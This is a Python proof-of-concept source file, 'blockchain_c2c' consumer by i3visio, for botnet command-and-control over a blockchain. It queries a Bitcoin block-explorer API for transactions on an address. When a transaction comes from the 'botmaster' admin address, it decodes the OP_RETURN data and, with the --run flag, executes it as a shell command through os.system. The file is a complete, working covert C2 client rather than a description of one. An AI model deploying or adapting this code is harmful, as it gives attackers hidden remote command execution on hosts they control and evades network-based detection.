# !/usr/bin/python2
# -*- coding: utf-8 -*-
#
################################################################################
#
#    Copyright 2017 Félix Brezo and Yaiza Rubio (i3visio, contacto@i3visio.com)
#
#    This file is part of blockchain_c2c. You can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
################################################################################


import argparse
from binascii import unhexlify
import json
import os
import sys

try:
    # Support for Python 3
    import urllib.request as u
except:
    # Support for Python 2
    import urllib as u


__version__  = "0.2.0"


def getTransactionsData(address, netcode="XTN", provider="bitpay.com"):
    """
    Method that recovers the data found about an address

    Args:
    -----
        address: A string representing the target address.
        netcode: A string representing the netcode.
        provider: A string representing the target provider.

    Returns:
    --------
        A dictionary reprsenting the data recovered from the blockchain.
    """
    def _buildURL(address, netcode="XTN", provider="bitpay.com"):
        """
        Method that just builds the target URL

        It replaces the keyword "<ADDRESS>" for the value provided by parameter.

        Args:
        -----
            address: A string representing the target address.
            netcode: A string representing the netcode.
            provider: A string representing the target provider.

        Returns:
        --------
            A string with the target URL from which the data will be obtained.
        """
        URL = {
            "XTN": {
                "bitpay.com": {
                    "address": "https://test-insight.bitpay.com/api/addr/<ADDRESS>",
                    "transactions": "https://test-insight.bitpay.com/api/txs/?address=<ADDRESS>",
                }
            },
            "BTC":  {
                "bitpay.com": {
                    "address": "https://insight.bitpay.com/api/addr/<ADDRESS>",
                    "transactions": "https://insight.bitpay.com/api/txs/?address=<ADDRESS>",
                }
            },
        }
        base_url = URL[netcode][provider]["transactions"]
        return base_url.replace("<ADDRESS>", address)

    url = _buildURL(address, netcode=netcode)
    raw = u.urlopen(url).read()
    data = json.loads(raw)
    return data


def searchCommands(admin_address, target_address, network="XTN", provider="bitpay.com", run=False):
    """
    The method that performs the search

    Args:
    -----
        admin_address: A string representing the botmaster address. This is
            needed to provide a basic authentication and avoid hijacking of the
            client. Only the transactions in which this address appears as an
            input will be considered valid because it is signed.
        target_address: A string representing the place where the information
            will be found. This can be the same as the admin_address but it is
            not needed.
        netcode: A string representing the network.
        provider: A string representing the target provider.
        run: A boolean representing whether to try to launch the data read from
            the blockchain.

    Returns:
    --------
        A string with the deserialized data.
    """
    data = getTransactionsData(target_address, network, provider)

    print("\n> Info recovered from " + target_address)
    print("\n> Transactions recovered from " + target_address+  ": " + str(len(data["txs"])))

    for i, tx in enumerate(data["txs"]):
        print("\n> Processing transaction " + str(i+1) + "/" + str(len(data["txs"])) + "...")
        # Check if the emitter is the admin
        is_admin = False
        for v in tx["vin"]:
            if v["addr"] == admin_address:
                is_admin = True
                break
        # Exiting this transaction if no admin found
        if not is_admin:
            break

        for v in tx["vout"]:
            if "OP_RETURN" in v["scriptPubKey"]["asm"]:
                info = v["scriptPubKey"]["asm"].split(" ")[1]
                decoded_info = unhexlify(info)
                print("\n> Information found in OP_RETURN transaction: '" + decoded_info + "'.")
                if run:
                    print("\n> Trying to run as a command:\n$" + decoded_info)
                    os.system(decoded_info)
                return decoded_info


def getParser():
    parser = argparse.ArgumentParser(description='Blockchain C2C [Consumer] - A consumer of information stored in a blockchain.', add_help=False)
    parser._optionals.title = "Input options (one required)"

    # Configuring the processing options
    groupProcessing = parser.add_argument_group('Processing arguments', 'Configuring the way in which the applicaiton will behave.')
    groupProcessing.add_argument('-p', '--provider', required=False, default="bitpay.com", choices=["bitpay.com"], action='store', help='Selects the provider where the data will be searched.')
    groupProcessing.add_argument('--different_target', required=False, default=False, action='store_true', help='Defines whether the target address is different to the admin.')
    groupProcessing.add_argument('--run', required=False, default=False, action='store_true', help='Runs the information recovered as a command.')

    # About options
    groupAbout = parser.add_argument_group('About arguments', 'Showing additional information about this program.')
    groupAbout.add_argument('-h', '--help', action='help', help='shows this help and exists.')
    groupAbout.add_argument('--version', action='version', version=__version__, help='shows the version of the program and exists.')

    return parser


def main(params):
    """
    Method that wraps up the collection of information

    Args:
    -----
        params: The list of parameters provided using the terminal.
    """
    banner = """
     ____  _            _        _           _          ____ ____   ____
    | __ )| | ___   ___| | _____| |__   __ _(_)_ __    / ___|___ \ / ___|
    |  _ \| |/ _ \ / __| |/ / __| '_ \ / _` | | '_ \  | |     __) | |
    | |_) | | (_) | (__|   < (__| | | | (_| | | | | | | |___ / __/| |___
    |____/|_|\___/ \___|_|\_\___|_| |_|\__,_|_|_| |_|  \____|_____|\____|

                    A PoC to grab data from several blockchains by:
                            - Yaiza Rubio (@yrubiosec)
                            - Félix Brezo (@febrezo)"""
    print(banner)

    # Grabbing the parser
    parser = getParser()

    if params != None:
        args = parser.parse_args(params)
    else:
        args = parser.parse_args()

    # Collecting the data
    network = raw_input("\n> Choose type of network (BTC, XTN, LTC, ...) [XTN]: ") or "XTN"
    print("\tNetwork: " + network)

    # Getting the administrators address! Needed so as to prevent hijacking!
    admin = raw_input("\n> Type the ADMIN address: ")
    print("\tADMIN address: " + admin)
    if admin == "":
        print("No ADMIN address provided.")
        sys.exit()

    # Getting the address to be monitored
    if args.different_target:
        target = raw_input("\n> Type the TARGET address [" + admin + "]: ")
        if target == "":
            print("No TARGET address provided. ADMIN is assumed.")
            target = admin
    else:
        target = admin
    print("\tTARGET address: " + target)

    searchCommands(
        admin_address=admin,
        target_address=target,
        network=network,
        run=args.run,
        provider=args.provider
    )


if __name__ == "__main__":
    main(sys.argv[1:])
